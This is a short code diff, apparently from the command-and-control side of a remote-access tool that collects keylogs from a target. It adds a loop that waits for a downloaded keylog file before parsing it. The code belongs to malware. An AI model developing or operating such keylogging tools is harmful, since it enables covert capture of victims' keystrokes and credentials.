@@ -86,6 +86,8 @@ def target_communication():
                 #    pass
                 # download_file('keylog' + str(keylogs) + '.txt')
                 #print('Registo de teclas guardado como keylog' + str(keylogs) + '.txt')
+                while not os.path.exists('./' + 'keylog' + str(key_logs) + '.txt'):
+                    pass
                 parse_log('keylog' + str(key_logs) + '.txt')
                 keylogger = False
                 keylogs += 1              
